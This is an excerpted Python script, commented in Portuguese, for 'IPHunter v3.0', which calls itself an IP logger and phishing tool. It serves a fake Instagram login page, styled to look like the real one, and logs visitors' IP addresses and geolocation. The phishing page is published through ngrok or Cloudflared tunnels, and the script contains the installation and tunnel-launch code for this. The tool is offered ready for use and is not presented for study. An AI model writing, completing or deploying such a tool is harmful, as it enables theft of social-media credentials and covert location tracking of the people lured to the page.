...
# -*- coding: utf-8 -*-
# ============================================================
#  IPHunter v3.0 - IP Logger & Phishing Tool
#  Instagram 2026 Edition - Geolocalizacao Completa
# ============================================================
...
# ============================================================
#  INSTAGRAM TEMPLATE 2026 - IGUAL DA FOTO
# ============================================================
...
.inp::placeholder { color: #8a9aa5; }
.inp:focus { border-color: #5a6a74; }
.btn-login {
  width: 100%;
  padding: 14px;
  margin-top: 14px;
...
.meta svg { width: 16px; height: 16px; fill: #8a9aa5; }
...
def install_ngrok():
    ...
    for install_dir in install_dirs:
        try:
            ...
            os.system(f"tar -xzf {tmp_tar} -C {install_dir} 2>/dev/null")
    ...
    if not installed:
        ...
        print_info("Configure seu authtoken em: https://dashboard.ngrok.com")
    return installed

def start_ngrok(port):
    """Inicia o tunel ngrok - CORRIGIDO PARA TERMUX"""
    print_info("Iniciando ngrok...")
    os.system("pkill -f 'ngrok http' 2>/dev/null")
    time.sleep(1)
    ngrok_cmd = 'ngrok'
    for path in ['/data/data/com.termux/files/usr/bin/ngrok', '/usr/local/bin/ngrok', os.path.expanduser('~/.local/bin/ngrok'), os.path.expanduser('~/ngrok')]:
        if os.path.exists(path):
            ngrok_cmd = path
            break
    log_file = '/tmp/ngrok.log'
    os.system(f"rm -f {log_file}")
    cmd = f"nohup {ngrok_cmd} http {port} --log=stdout > {log_file} 2>&1 &"
    os.system(cmd)
    time.sleep(4)
    for _ in range(20):
        try:
            result = subprocess.run(['curl', '-s', '--max-time', '3', 'http://127.0.0.1:4040/api/tunnels'],
    ...
    try:
        if os.path.exists(log_file):
            with open(log_file, 'r') as f:
                log_content = f.read()
            url_match = re.search(r'url=(https://[a-zA-Z0-9-]+\.ngrok-free\.app)', log_content)
            if url_match:
                url = url_match.group(1)
                print_ok(f"Tunel ativo (log): {url}")
                return url
    except:
        pass
    print_error("Ngrok nao conseguiu criar o tunel.")
    print_info("Verifique se configurou o authtoken:")
    print_info("  ngrok config add-authtoken SEU_TOKEN")
    print_info("Ou use Cloudflared (opcao 2) que nao precisa de token!")
    return None
...
def show_banner():
    ...
    print(BANNER)
    print()
    print(C.BRIGHT_CYAN + C.BOLD + "           IPHunter v3.0 - IP Logger & Phishing Tool" + C.RESET)
...
def show_tunnel_menu():
    ...
    print(f"    {C.BRIGHT_GREEN}{C.BOLD}[1]{C.RESET} {C.WHITE}Ngrok (Requer authtoken){C.RESET}")
    print(f"    {C.BRIGHT_BLUE}{C.BOLD}[2]{C.RESET} {C.WHITE}Cloudflared (Recomendado - Sem token){C.RESET}")
...
def main():
    ...
    while True:
        ...
        if choice == '99':
            ...
            clear()
            print()
            print_header("Obrigado por usar o IPHunter v3.0!")
            print()
            break
...
if __name__ == "__main__":
    try:
        ...
        clear()
        print()
        print_header("IPHunter v3.0 encerrado pelo usuario.")
        print()
    except Exception as e:
        clear()
        print()
